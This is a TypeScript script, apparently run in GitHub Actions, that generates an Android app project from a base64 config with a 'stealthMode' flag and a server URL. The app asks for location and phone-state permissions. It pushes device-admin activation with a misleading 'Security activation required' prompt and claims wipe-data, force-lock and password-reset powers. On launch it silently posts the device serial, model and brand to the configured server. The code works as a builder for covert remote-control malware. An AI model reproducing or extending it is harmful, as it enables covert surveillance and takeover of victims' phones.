import { promises as fs } from "fs";
import path from "path";

export interface APKConfig {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  stealthMode: boolean;
  sslEnabled: boolean;
  ports: number[];
  serverUrl: string;
  iconUrl?: string;
}

// Read from environment variables (set by GitHub Actions)
const configBase64 = process.env.APK_CONFIG_BASE64 || process.argv[2];
const buildId = process.env.BUILD_ID || process.argv[3] || "test-build";

if (!configBase64) {
  console.error("ERROR: APK_CONFIG_BASE64 environment variable is not set.");
  process.exit(1);
}

let config: APKConfig;
try {
  config = JSON.parse(Buffer.from(configBase64, "base64").toString("utf-8"));
  console.log(`Generating APK project for: ${config.appName} (${config.packageName})`);
} catch (e) {
  console.error("ERROR: Failed to parse APK config from base64:", e);
  process.exit(1);
}

const buildDir = path.join(process.cwd(), "builds");
const projectDir = path.join(buildDir, buildId);

async function generateFiles() {
  try {
    const dirs = [
      "app/src/main",
      "app/src/main/java",
      "app/src/main/res/values",
      "app/src/main/res/xml",
      "app/src/main/res/drawable",
      "gradle/wrapper",
    ];

    for (const dir of dirs) {
      await fs.mkdir(path.join(projectDir, dir), { recursive: true });
    }

    // Root settings.gradle - must be first
    const settingsGradle = `pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "APKBuilder"
include ':app'
`;
    await fs.writeFile(path.join(projectDir, "settings.gradle"), settingsGradle);

    // Root build.gradle
    const rootBuildGradle = `// Top-level build file
plugins {
    id 'com.android.application' version '8.2.2' apply false
}
`;
    await fs.writeFile(path.join(projectDir, "build.gradle"), rootBuildGradle);

    // gradle.properties
    const gradleProperties = `android.useAndroidX=true
android.enableJetifier=true
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
`;
    await fs.writeFile(path.join(projectDir, "gradle.properties"), gradleProperties);

    // local.properties (required by AGP)
    const sdkDir = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT || "/usr/local/lib/android/sdk";
    await fs.writeFile(path.join(projectDir, "local.properties"), `sdk.dir=${sdkDir}\n`);

    // app/build.gradle
    const appBuildGradle = `plugins {
    id 'com.android.application'
}

android {
    namespace '${config.packageName}'
    compileSdk 34

    defaultConfig {
        applicationId '${config.packageName}'
        minSdk 21
        targetSdk 34
        versionCode ${config.versionCode}
        versionName '${config.versionName}'
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
`;
    await fs.writeFile(path.join(projectDir, "app/build.gradle"), appBuildGradle);

    // proguard-rules.pro
    await fs.writeFile(path.join(projectDir, "app/proguard-rules.pro"), "# Add project specific ProGuard rules here.\n");

    // AndroidManifest.xml
    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />

    <application
        android:allowBackup="true"
        android:label="${config.appName}"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:usesCleartextTraffic="${!config.sslEnabled}">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <receiver
            android:name=".AdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/AndroidManifest.xml"), manifest);

    // strings.xml
    const strings = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
    <string name="server_url">${config.serverUrl}</string>
    <string name="server_ports">${config.ports.join(",")}</string>
    <string name="stealth_mode">${config.stealthMode}</string>
</resources>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/res/values/strings.xml"), strings);

    // device_admin.xml
    const deviceAdminXml = `<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <disable-camera />
    </uses-policies>
</device-admin>`;
    await fs.writeFile(path.join(projectDir, "app/src/main/res/xml/device_admin.xml"), deviceAdminXml);

    // Java sources
    const packagePath = config.packageName.replace(/\./g, "/");
    await fs.mkdir(path.join(projectDir, `app/src/main/java/${packagePath}`), { recursive: true });

    const mainActivity = `package ${config.packageName};

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        TextView textView = new TextView(this);
        textView.setText("${config.appName}");
        setContentView(textView);

        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security activation required.");
            startActivityForResult(intent, 1);
        }

        registerDevice();
    }

    private void registerDevice() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String serverUrl = "${config.serverUrl}";
                    java.net.URL url = new java.net.URL(serverUrl + "/api/devices/register");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(5000);
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");
                    String deviceId = android.os.Build.SERIAL;
                    String json = "{\\"deviceId\\":\\"" + deviceId + "\\",\\"model\\":\\"" + android.os.Build.MODEL + "\\",\\"brand\\":\\"" + android.os.Build.BRAND + "\\"}";
                    byte[] input = json.getBytes("utf-8");
                    conn.getOutputStream().write(input, 0, input.length);
                    conn.getResponseCode();
                } catch (Exception e) {
                    // Silently fail
                }
            }
        }).start();
    }
}`;
    await fs.writeFile(path.join(projectDir, `app/src/main/java/${packagePath}/MainActivity.java`), mainActivity);

    const adminReceiver = `package ${config.packageName};

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Disabling this will remove access to corporate resources.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }
}`;
    await fs.writeFile(path.join(projectDir, `app/src/main/java/${packagePath}/AdminReceiver.java`), adminReceiver);

    console.log(`âœ… Project files successfully generated in ${projectDir}`);
    console.log(`   - Package: ${config.packageName}`);
    console.log(`   - Version: ${config.versionName} (${config.versionCode})`);
    console.log(`   - Server: ${config.serverUrl}`);
  } catch (error) {
    console.error("Error generating files:", error);
    process.exit(1);
  }
}

generateFiles();
